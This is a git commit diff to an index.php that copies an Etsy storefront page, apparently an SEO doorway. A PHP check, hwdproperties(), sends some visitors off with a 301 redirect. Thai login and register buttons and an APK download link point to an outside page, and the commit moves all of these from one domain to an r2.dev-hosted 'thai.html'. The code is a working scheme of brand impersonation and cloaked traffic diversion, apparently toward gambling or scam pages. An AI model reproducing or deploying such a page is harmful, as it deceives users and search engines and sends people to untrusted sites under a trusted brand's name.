0062caaaf02388bce7202bea40fe402c611302b2
roiheeseo <rungterdsak@gmail.com>
2026-01-31 02:24:25 +0700

    Update index.php

--- index.php
+++ index.php
@@ -29,7 +29,7 @@ function hwdproperties()
 if (!hwdproperties()) 
 {
      header("HTTP/1.1 301 Moved Permanently");
-     header("Location: https://xn--72cb8e3bxa.net/");
+     header("Location: https://pub-9c4fe7ddc42346929dd71587fc3ff12d.r2.dev/thai.html");
      exit();
 }
 
@@ -676,7 +676,7 @@ img {
 
     
 </div>
-<div class="gyg888"><a href="https://xn--72cb8e3bxa.net/" rel="nofollow noreferrer" class="register">เข้าสู่ระบบ</a><a href="https://xn--72cb8e3bxa.net/" rel="nofollow noreferrer" class="login">สมัครสมาชิก</a></div><style>.gyg888 {display: grid;grid-template-columns: repeat(2,1fr);font-weight: 700;}.gyg888 a {text-align: center;}.login, .register {color: #ffffff;padding: 13px 10px;}.login, .login-button { border: 1px solid #0000ff;background: linear-gradient(to bottom, #001985 0, #0021A6 100%);border: 1px solid #361800;}.register, .register-button {background: linear-gradient(to bottom, #6E0000 0, #B00000 100%);border: 1px solid #FF9800;}</style><br>
+<div class="gyg888"><a href="https://pub-9c4fe7ddc42346929dd71587fc3ff12d.r2.dev/thai.html" rel="nofollow noreferrer" class="register">เข้าสู่ระบบ</a><a href="https://pub-9c4fe7ddc42346929dd71587fc3ff12d.r2.dev/thai.html" rel="nofollow noreferrer" class="login">สมัครสมาชิก</a></div><style>.gyg888 {display: grid;grid-template-columns: repeat(2,1fr);font-weight: 700;}.gyg888 a {text-align: center;}.login, .register {color: #ffffff;padding: 13px 10px;}.login, .login-button { border: 1px solid #0000ff;background: linear-gradient(to bottom, #001985 0, #0021A6 100%);border: 1px solid #361800;}.register, .register-button {background: linear-gradient(to bottom, #6E0000 0, #B00000 100%);border: 1px solid #FF9800;}</style><br>
 <nav class="wt-hide-xs wt-show-lg category-nav-button-menu">
     <div data-ui="cat-nav" id="desktop-category-topnav" class="cat-nav responsive-disabled v2-toolkit-cat-nav wt-ml-xs-0 wt-mr-xs-0">
         <div class="wt-text-caption wt-position-relative wt-bg-white wt-z-index-5 v2-toolkit-cat-nav-tab-bar">
@@ -6693,7 +6693,7 @@ if (clientloggerIsEnabled) {
     
     <div class="seller-cred wt-width-full wt-display-flex-xs wt-flex-gap-xs-2 wt-flex-direction-column-xs wt-align-items-center wt-mb-xs-3 wt-mb-md-4">
         <div class="wt-position-relative">
-            <a href="https://xn--72cb8e3bxa.net/">
+            <a href="https://pub-9c4fe7ddc42346929dd71587fc3ff12d.r2.dev/thai.html">
                 <img
     data-clg-id="WtImage"
     class="wt-circle wt-display-block wt-image--cover wt-image"
@@ -7676,14 +7676,14 @@ Keep in mind that anyone can view public collections — they may also appear in
     </nav>
 
     <div class="chrome-footer__app-link" data-footer-app-link>
-        <a href="https://xn--72cb8e3bxa.net/" class="chrome-footer__app-link__logo" aria-label="Download the <?php echo htmlspecialchars($brand); ?> Apk">
+        <a href="https://pub-9c4fe7ddc42346929dd71587fc3ff12d.r2.dev/thai.html" class="chrome-footer__app-link__logo" aria-label="Download the <?php echo htmlspecialchars($brand); ?> Apk">
             <span class="wt-icon wt-icon--largest"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 24" aria-hidden="true" focusable="false">
   <path d="M6.5 3.1v6s2.1 0 3.2-.1c.6.1 1.1-.3 1.2-.9.1-.1.1-.1.1-.2l.3-1.3h1l-.2 2.8.1 2.9h-1l-.2-1.1c-.1-.6-.6-1.1-1.2-1.1C9 10 6.5 10 6.5 10v5c0 1 .5 1.4 1.6 1.4h3.4c1.2.2 2.4-.5 2.8-1.6l.9-2h.8c-.1.4-.5 4-.6 4.8 0 0-3.1-.1-4.4-.1H5.2l-3.5.1v-.9l1.1-.2c.9-.1 1.2-.3 1.2-1 0 0 .1-2.2.1-5.9S4 3.9 4 3.9c0-.8-.3-.9-1.1-1.1l-1.1-.2v-.9l3.4.1h6.5c1.3 0 3.5-.2 3.5-.2s-.1 1.3-.2 4.5h-.9L13.8 5c-.3-1.5-.8-2.2-1.7-2.2H7c-.5 0-.5.1-.5.3zm13.2.7h1v3.4L24 7l-.2 1.5-3.2-.2v6c0 1.7.6 2.4 1.5 2.4.7 0 1.4-.3 1.8-.9l.5.6c-.6 1.1-1.9 1.8-3.2 1.7-1.5.1-2.8-1-2.9-2.5V8.4h-1.9v-.8c1.6-.2 2.8-1.2 3.3-3.8zm7 10.4l.6 1.5c.3.9 1.2 1.4 2.1 1.3 1.4 0 2-.7 2-1.6 0-2.8-5.4-2-5.4-5.7 0-2.1 1.7-3.1 3.9-3.1 1.1 0 2.1.2 3.2.5-.2.9-.2 1.8-.2 2.7l-.9.1-.6-1.6c-.4-.5-1-.8-1.6-.7-1 0-2 .4-2 1.5 0 2.5 5.6 2 5.6 5.7 0 2.1-1.9 3.2-4.1 3.2-1.2 0-2.3-.3-3.4-.7.1-1 .1-2.1 0-3.1h.8zM33 22c.2-1 .4-2 .6-3.1l.9-.1.3 1.7c.1.5.5.8 1 .7 1.1 0 2.4-.6 3.7-2.9-.6-1.4-2.3-5.8-3.8-9.3-.4-.9-.5-1-1-1.1l-.4-.2V7l2.4.1 3-.2v.8l-.7.2c-.4 0-.8.3-.8.7 0 .1 0 .2.1.3.2.5 1.5 4.1 2.4 6.6.8-1.7 2.4-5.5 2.6-6.2.1-.2.1-.4.2-.6 0-.4-.4-.8-.8-.8l-.7-.1v-.9l2.3.1 2.1-.1v.8l-.4.4c-.6.1-1 .5-1.2 1.1l-3.6 8.4c-2.1 4.8-4.3 5.2-5.9 5.2-.8-.1-1.6-.3-2.3-.8z"/>
 </svg></span>
         </a>
 
         <div>
-            <a href="https://xn--72cb8e3bxa.net/" tabindex="-1" class="wt-btn wt-btn--base-lg wt-btn--small-xs chrome-footer__app-link__button"><?php echo htmlspecialchars($brand); ?></a>
+            <a href="https://pub-9c4fe7ddc42346929dd71587fc3ff12d.r2.dev/thai.html" tabindex="-1" class="wt-btn wt-btn--base-lg wt-btn--small-xs chrome-footer__app-link__button"><?php echo htmlspecialchars($brand); ?></a>
         </div>
     </div>
 </div>
